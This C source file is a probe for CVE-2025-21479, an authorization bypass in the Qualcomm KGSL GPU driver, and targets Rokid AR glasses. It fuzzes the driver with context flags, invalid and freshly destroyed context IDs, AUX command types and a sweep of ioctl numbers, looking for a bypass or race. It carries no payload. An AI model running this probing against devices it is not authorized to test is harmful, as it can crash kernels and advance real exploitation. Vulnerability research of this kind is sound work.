/*
 * CVE-2025-21479 GPU Micronode Authorization Bypass Probe v2
 * ===========================================================
 *
 * Simplified probe focusing on context creation and IOCTL exploration.
 * The original probe failed on context creation - this version tries
 * different flag combinations.
 *
 * Key insight: The KGSL driver may require specific context type flags.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

// ═══════════════════════════════════════════════════════════════════════════
// KGSL Definitions
// ═══════════════════════════════════════════════════════════════════════════

#define KGSL_IOC_TYPE 0x09

/* Context flags */
#define KGSL_CONTEXT_SAVE_GMEM 0x00000001
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CONTEXT_SUBMIT_IB_LIST 0x00000004
#define KGSL_CONTEXT_CTX_SWITCH 0x00000008
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_TRASH_STATE 0x00000020
#define KGSL_CONTEXT_PER_CONTEXT_TS 0x00000040
#define KGSL_CONTEXT_USER_GENERATED_TS 0x00000080
#define KGSL_CONTEXT_END_OF_FRAME 0x00000100
#define KGSL_CONTEXT_NO_FAULT_TOLERANCE 0x00000200
#define KGSL_CONTEXT_SYNC 0x00000400
#define KGSL_CONTEXT_PWR_CONSTRAINT 0x00000800
#define KGSL_CONTEXT_PRIORITY_MASK 0x0000F000
#define KGSL_CONTEXT_PRIORITY_SHIFT 12
#define KGSL_CONTEXT_IFH_NOP 0x00010000
#define KGSL_CONTEXT_SECURE 0x00020000
#define KGSL_CONTEXT_NO_SNAPSHOT 0x00040000
#define KGSL_CONTEXT_SPARSE 0x00080000
#define KGSL_CONTEXT_PREEMPT_STYLE_MASK 0x0E000000
#define KGSL_CONTEXT_PREEMPT_STYLE_SHIFT 25

/* Context types */
#define KGSL_CONTEXT_TYPE_MASK 0x01F00000
#define KGSL_CONTEXT_TYPE_SHIFT 20
#define KGSL_CONTEXT_TYPE_ANY 0
#define KGSL_CONTEXT_TYPE_GL 1
#define KGSL_CONTEXT_TYPE_CL 2
#define KGSL_CONTEXT_TYPE_C2D 3
#define KGSL_CONTEXT_TYPE_RS 4

/* Helper to set context type */
#define KGSL_CONTEXT_TYPE(type) ((type) << KGSL_CONTEXT_TYPE_SHIFT)

/* IOCTL structures */
struct kgsl_devinfo
{
    unsigned int device_id;
    unsigned int chip_id;
    unsigned int mmu_enabled;
    unsigned long gmem_gpubaseaddr;
    unsigned int gpu_id;
    size_t gmem_sizebytes;
};

struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    size_t sizebytes;
};

struct kgsl_drawctxt_create
{
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_drawctxt_destroy
{
    unsigned int drawctxt_id;
};

struct kgsl_version
{
    unsigned int drv_major;
    unsigned int drv_minor;
    unsigned int dev_major;
    unsigned int dev_minor;
};

/* GPU memory allocation */
struct kgsl_gpumem_alloc
{
    unsigned long gpuaddr;
    size_t size;
    unsigned int flags;
};

struct kgsl_gpumem_alloc_id
{
    unsigned int id;
    unsigned int flags;
    unsigned int size;
    unsigned int mmapsize;
    unsigned long gpuaddr;
    unsigned int __pad[2];
};

/* IB descriptor */
struct kgsl_ibdesc
{
    uint64_t gpuaddr;
    uint64_t sizedwords;
    unsigned int ctrl;
};

/* Submit commands - modern path */
struct kgsl_submit_commands
{
    unsigned int context_id;
    unsigned int flags;
    struct kgsl_ibdesc *cmdlist;
    unsigned int numcmds;
    void *synclist;
    unsigned int numsyncs;
    unsigned int timestamp;
    unsigned int __pad[4];
};

/* GPU Command - newer path */
struct kgsl_gpu_command
{
    uint64_t flags;
    uint64_t cmdlist;
    uint64_t cmdsize;
    uint64_t objlist;
    uint64_t objsize;
    uint64_t synclist;
    uint64_t syncsize;
    unsigned int context_id;
    unsigned int numcmds;
    unsigned int numobjs;
    unsigned int numsyncs;
    unsigned int timestamp;
    unsigned int cmdlist_size;
    unsigned int objlist_size;
    unsigned int synclist_size;
};

/* GPU AUX Command - potential micronode path */
struct kgsl_gpu_aux_command
{
    uint64_t flags;
    uint64_t cmdlist;
    unsigned int cmdlist_size;
    unsigned int cmd_type;
    unsigned int context_id;
    unsigned int timestamp;
};

/* Legacy IB submission */
struct kgsl_ringbuffer_issueibcmds
{
    unsigned int drawctxt_id;
    unsigned int ibdesc_addr;
    unsigned int numibs;
    unsigned int timestamp;
    unsigned int flags;
};

/* ──────────────────────────────────────────────────────────────────────── */
/* IOCTL Definitions                                                        */
/* ──────────────────────────────────────────────────────────────────────── */

#define KGSL_PROP_DEVICE_INFO 0x1
#define KGSL_PROP_VERSION 0x8

#define IOCTL_KGSL_DEVICE_GETPROPERTY \
    _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)

#define IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS \
    _IOWR(KGSL_IOC_TYPE, 0x10, struct kgsl_ringbuffer_issueibcmds)

#define IOCTL_KGSL_DRAWCTXT_CREATE \
    _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

#define IOCTL_KGSL_DRAWCTXT_DESTROY \
    _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)

#define IOCTL_KGSL_GPUMEM_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x2f, struct kgsl_gpumem_alloc)

#define IOCTL_KGSL_GPUMEM_ALLOC_ID \
    _IOWR(KGSL_IOC_TYPE, 0x34, struct kgsl_gpumem_alloc_id)

#define IOCTL_KGSL_SUBMIT_COMMANDS \
    _IOWR(KGSL_IOC_TYPE, 0x3D, struct kgsl_submit_commands)

#define IOCTL_KGSL_GPU_COMMAND \
    _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

#define IOCTL_KGSL_GPU_AUX_COMMAND \
    _IOWR(KGSL_IOC_TYPE, 0x4B, struct kgsl_gpu_aux_command)

// ═══════════════════════════════════════════════════════════════════════════
// Global State
// ═══════════════════════════════════════════════════════════════════════════

static int kgsl_fd = -1;

// ═══════════════════════════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════════════════════════

void print_banner(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  CVE-2025-21479 GPU Micronode Authorization Bypass Probe v2   ║\n");
    printf("║  ───────────────────────────────────────────────────────────  ║\n");
    printf("║  Target: Rokid AR Glasses (Adreno 621, Kernel 5.10.209)       ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");
}

void print_device_info(void)
{
    struct kgsl_devinfo devinfo = {0};
    struct kgsl_device_getproperty prop = {
        .type = KGSL_PROP_DEVICE_INFO,
        .value = &devinfo,
        .sizebytes = sizeof(devinfo),
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
    {
        printf("[*] Device Info:\n");
        printf("    Chip ID:    0x%08x (Adreno %d%d%d)\n",
               devinfo.chip_id,
               (devinfo.chip_id >> 24) & 0xFF,
               (devinfo.chip_id >> 16) & 0xFF,
               (devinfo.chip_id >> 8) & 0xFF);
        printf("    GPU ID:     0x%08x\n", devinfo.gpu_id);
        printf("    MMU:        %s\n", devinfo.mmu_enabled ? "Enabled" : "Disabled");
        printf("    GMEM:       0x%zx (%zu KB)\n",
               devinfo.gmem_sizebytes, devinfo.gmem_sizebytes / 1024);
    }
    else
    {
        printf("[-] Failed to get device info: %s\n", strerror(errno));
    }
}

void print_version(void)
{
    struct kgsl_version ver = {0};
    struct kgsl_device_getproperty prop = {
        .type = KGSL_PROP_VERSION,
        .value = &ver,
        .sizebytes = sizeof(ver),
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
    {
        printf("[*] KGSL Version: Driver %u.%u, Device %u.%u\n",
               ver.drv_major, ver.drv_minor, ver.dev_major, ver.dev_minor);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Context Creation Tests
// ═══════════════════════════════════════════════════════════════════════════

typedef struct
{
    const char *name;
    unsigned int flags;
} context_test_t;

/* Various context flag combinations to try */
static context_test_t context_tests[] = {
    /* Minimal flags */
    {"flags=0 (bare minimum)", 0},

    /* Standard GL context */
    {"GL context type", KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_GL)},

    /* GL with IB list */
    {"GL + SUBMIT_IB_LIST",
     KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_GL) | KGSL_CONTEXT_SUBMIT_IB_LIST},

    /* GL with per-context timestamps */
    {"GL + PER_CONTEXT_TS",
     KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_GL) | KGSL_CONTEXT_PER_CONTEXT_TS},

    /* Compute (CL) context */
    {"CL context type", KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_CL)},

    /* C2D context */
    {"C2D context type", KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_C2D)},

    /* RenderScript context */
    {"RS context type", KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_RS)},

    /* Any context */
    {"ANY context type", KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_ANY)},

    /* With preamble */
    {"GL + PREAMBLE",
     KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_GL) | KGSL_CONTEXT_PREAMBLE},

    /* No fault tolerance (interesting for exploitation) */
    {"GL + NO_FAULT_TOLERANCE",
     KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_GL) | KGSL_CONTEXT_NO_FAULT_TOLERANCE},

    /* Try with priority */
    {"GL + priority 1",
     KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_GL) | (1 << KGSL_CONTEXT_PRIORITY_SHIFT)},

    /* SECURE context (likely requires privileges) */
    {"GL + SECURE (expect fail)",
     KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_GL) | KGSL_CONTEXT_SECURE},

    /* Full featured GL context */
    {"Full GL context",
     KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_GL) |
         KGSL_CONTEXT_SUBMIT_IB_LIST |
         KGSL_CONTEXT_PER_CONTEXT_TS |
         KGSL_CONTEXT_PREAMBLE},

    /* Context switch enabled */
    {"GL + CTX_SWITCH",
     KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_GL) | KGSL_CONTEXT_CTX_SWITCH},
};

void test_context_creation(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: Context Creation with Various Flags\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    int success_count = 0;
    unsigned int created_contexts[32];
    int num_created = 0;

    int num_tests = sizeof(context_tests) / sizeof(context_tests[0]);

    for (int i = 0; i < num_tests; i++)
    {
        struct kgsl_drawctxt_create create = {
            .flags = context_tests[i].flags,
            .drawctxt_id = 0,
        };

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create);

        if (ret == 0)
        {
            printf("[+] SUCCESS: %s\n", context_tests[i].name);
            printf("    Context ID: %u, Returned flags: 0x%08x\n",
                   create.drawctxt_id, create.flags);

            if (num_created < 32)
            {
                created_contexts[num_created++] = create.drawctxt_id;
            }
            success_count++;
        }
        else
        {
            printf("[-] FAILED:  %s (errno=%d: %s)\n",
                   context_tests[i].name, errno, strerror(errno));
        }
    }

    printf("\n[*] Context creation: %d/%d successful\n", success_count, num_tests);

    /* Clean up created contexts */
    for (int i = 0; i < num_created; i++)
    {
        struct kgsl_drawctxt_destroy destroy = {
            .drawctxt_id = created_contexts[i],
        };
        ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
    }
    printf("[*] Cleaned up %d contexts\n", num_created);
}

// ═══════════════════════════════════════════════════════════════════════════
// GPU Memory Allocation Tests
// ═══════════════════════════════════════════════════════════════════════════

void test_gpu_memory(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: GPU Memory Allocation\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    /* Try legacy gpumem_alloc */
    struct kgsl_gpumem_alloc alloc = {
        .gpuaddr = 0,
        .size = 4096,
        .flags = 0,
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) == 0)
    {
        printf("[+] Legacy GPUMEM_ALLOC: SUCCESS\n");
        printf("    GPU Addr: 0x%lx, Size: %zu\n", alloc.gpuaddr, alloc.size);
    }
    else
    {
        printf("[-] Legacy GPUMEM_ALLOC: %s\n", strerror(errno));
    }

    /* Try newer gpumem_alloc_id */
    struct kgsl_gpumem_alloc_id alloc_id = {
        .id = 0,
        .flags = 0,
        .size = 4096,
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc_id) == 0)
    {
        printf("[+] GPUMEM_ALLOC_ID: SUCCESS\n");
        printf("    ID: %u, GPU Addr: 0x%lx, Size: %u, MmapSize: %u\n",
               alloc_id.id, alloc_id.gpuaddr, alloc_id.size, alloc_id.mmapsize);
    }
    else
    {
        printf("[-] GPUMEM_ALLOC_ID: %s\n", strerror(errno));
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// GPU Command Submission Tests (CVE-2025-21479 Vector)
// ═══════════════════════════════════════════════════════════════════════════

void test_gpu_commands(unsigned int ctx_id)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: GPU Command Submission (CVE-2025-21479 Vector)\n");
    printf(" Context ID: %u\n", ctx_id);
    printf("════════════════════════════════════════════════════════════════\n\n");

    /* Test 1: GPU_COMMAND with empty command list */
    printf("[*] Test 1: GPU_COMMAND (empty cmdlist)\n");
    struct kgsl_gpu_command gpu_cmd = {
        .flags = 0,
        .cmdlist = 0,
        .cmdsize = 0,
        .objlist = 0,
        .objsize = 0,
        .synclist = 0,
        .syncsize = 0,
        .context_id = ctx_id,
        .numcmds = 0,
        .numobjs = 0,
        .numsyncs = 0,
    };

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd);
    printf("    Result: %s (ret=%d, errno=%d)\n",
           ret == 0 ? "SUCCESS" : "FAILED", ret, errno);
    if (ret == 0)
    {
        printf("    Timestamp: %u\n", gpu_cmd.timestamp);
    }

    /* Test 2: GPU_AUX_COMMAND with various cmd_types */
    printf("\n[*] Test 2: GPU_AUX_COMMAND (various cmd_types)\n");
    for (int cmd_type = 0; cmd_type < 16; cmd_type++)
    {
        struct kgsl_gpu_aux_command aux_cmd = {
            .flags = 0,
            .cmdlist = 0,
            .cmdlist_size = 0,
            .cmd_type = cmd_type,
            .context_id = ctx_id,
        };

        ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux_cmd);
        if (ret == 0 || errno != EINVAL)
        {
            printf("    cmd_type=%d: %s (ret=%d, errno=%d: %s)\n",
                   cmd_type,
                   ret == 0 ? "SUCCESS" : "FAILED",
                   ret, errno, strerror(errno));
        }
    }

    /* Test 3: SUBMIT_COMMANDS (legacy path) */
    printf("\n[*] Test 3: SUBMIT_COMMANDS (legacy)\n");
    struct kgsl_submit_commands submit = {
        .context_id = ctx_id,
        .flags = 0,
        .cmdlist = NULL,
        .numcmds = 0,
        .synclist = NULL,
        .numsyncs = 0,
    };

    ret = ioctl(kgsl_fd, IOCTL_KGSL_SUBMIT_COMMANDS, &submit);
    printf("    Result: %s (ret=%d, errno=%d)\n",
           ret == 0 ? "SUCCESS" : "FAILED", ret, errno);

    /* Test 4: ISSUEIBCMDS (very legacy) */
    printf("\n[*] Test 4: RINGBUFFER_ISSUEIBCMDS (legacy)\n");
    struct kgsl_ringbuffer_issueibcmds issue = {
        .drawctxt_id = ctx_id,
        .ibdesc_addr = 0,
        .numibs = 0,
        .flags = 0,
    };

    ret = ioctl(kgsl_fd, IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS, &issue);
    printf("    Result: %s (ret=%d, errno=%d)\n",
           ret == 0 ? "SUCCESS" : "FAILED", ret, errno);
}

// ═══════════════════════════════════════════════════════════════════════════
// Invalid Context ID Tests (Authorization Bypass)
// ═══════════════════════════════════════════════════════════════════════════

void test_invalid_context_ids(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: Invalid Context IDs (Authorization Bypass Check)\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    unsigned int test_ids[] = {
        0,          /* Null context */
        0xFFFFFFFF, /* Invalid context marker */
        0xDEADBEEF, /* Random invalid */
        1,          /* Potentially valid (other process?) */
        1000,       /* High ID */
        0x80000000, /* Sign bit set */
    };

    for (int i = 0; i < sizeof(test_ids) / sizeof(test_ids[0]); i++)
    {
        unsigned int ctx_id = test_ids[i];

        printf("[*] Testing context_id = 0x%08x\n", ctx_id);

        /* Try GPU_COMMAND with this context ID */
        struct kgsl_gpu_command gpu_cmd = {
            .flags = 0,
            .cmdlist = 0,
            .cmdsize = 0,
            .context_id = ctx_id,
            .numcmds = 0,
        };

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd);
        printf("    GPU_COMMAND: ret=%d, errno=%d (%s)\n",
               ret, errno, strerror(errno));

        /* Try GPU_AUX_COMMAND */
        struct kgsl_gpu_aux_command aux_cmd = {
            .context_id = ctx_id,
            .cmd_type = 0,
        };

        ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux_cmd);
        printf("    GPU_AUX_COMMAND: ret=%d, errno=%d (%s)\n",
               ret, errno, strerror(errno));
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Rapid Context Creation/Destruction (Race Condition Check)
// ═══════════════════════════════════════════════════════════════════════════

void test_rapid_context_cycling(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: Rapid Context Create/Destroy Cycling\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    unsigned int flags = KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_GL) |
                         KGSL_CONTEXT_SUBMIT_IB_LIST;

    printf("[*] Creating and destroying contexts rapidly...\n");

    unsigned int ctx_ids[100];
    int created = 0;

    /* Create many contexts */
    for (int i = 0; i < 100; i++)
    {
        struct kgsl_drawctxt_create create = {
            .flags = flags,
        };

        if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create) == 0)
        {
            ctx_ids[created++] = create.drawctxt_id;
        }
    }

    printf("[*] Created %d contexts\n", created);

    /* Try to submit commands using destroyed context IDs */
    printf("[*] Destroying contexts and testing command submission...\n");

    for (int i = 0; i < created; i++)
    {
        unsigned int ctx_id = ctx_ids[i];

        /* Destroy context */
        struct kgsl_drawctxt_destroy destroy = {
            .drawctxt_id = ctx_id,
        };
        ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);

        /* Immediately try to use the destroyed context */
        struct kgsl_gpu_command gpu_cmd = {
            .context_id = ctx_id,
            .numcmds = 0,
        };

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd);
        if (ret == 0)
        {
            printf("[!] INTERESTING: GPU_COMMAND succeeded on destroyed context %u!\n", ctx_id);
        }
    }

    printf("[*] Context cycling test complete\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// IOCTL Enumeration
// ═══════════════════════════════════════════════════════════════════════════

void enumerate_ioctls(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: IOCTL Enumeration\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    printf("[*] Probing KGSL IOCTLs 0x00-0x60...\n\n");

    for (int cmd = 0; cmd <= 0x60; cmd++)
    {
        unsigned long ioctl_num = _IOWR(KGSL_IOC_TYPE, cmd, char[256]);
        char dummy[256] = {0};

        int ret = ioctl(kgsl_fd, ioctl_num, dummy);
        int err = errno;

        /* Interesting if NOT ENOTTY (unsupported) */
        if (err != ENOTTY && err != 515)
        { /* 515 = ENOIOCTLCMD on some systems */
            printf("    IOCTL 0x%02x: ret=%d, errno=%d (%s)\n",
                   cmd, ret, err, strerror(err));
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════════════════════════

int main(int argc, char **argv)
{
    print_banner();

    printf("[*] UID=%d, EUID=%d\n", getuid(), geteuid());

    /* Open KGSL device */
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Failed to open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0 (fd=%d)\n", kgsl_fd);

    /* Get device info */
    print_device_info();
    print_version();

    /* Run tests */
    test_context_creation();
    test_gpu_memory();

    /* Try to create a working context for further tests */
    unsigned int flags = KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_GL) |
                         KGSL_CONTEXT_SUBMIT_IB_LIST |
                         KGSL_CONTEXT_PER_CONTEXT_TS;

    struct kgsl_drawctxt_create create = {
        .flags = flags,
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create) == 0)
    {
        printf("\n[+] Created test context: ID=%u\n", create.drawctxt_id);
        test_gpu_commands(create.drawctxt_id);

        /* Cleanup */
        struct kgsl_drawctxt_destroy destroy = {
            .drawctxt_id = create.drawctxt_id,
        };
        ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
    }
    else
    {
        printf("\n[-] Could not create test context, skipping command tests\n");
    }

    test_invalid_context_ids();
    test_rapid_context_cycling();
    enumerate_ioctls();

    close(kgsl_fd);

    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" Probe Complete\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    return 0;
}
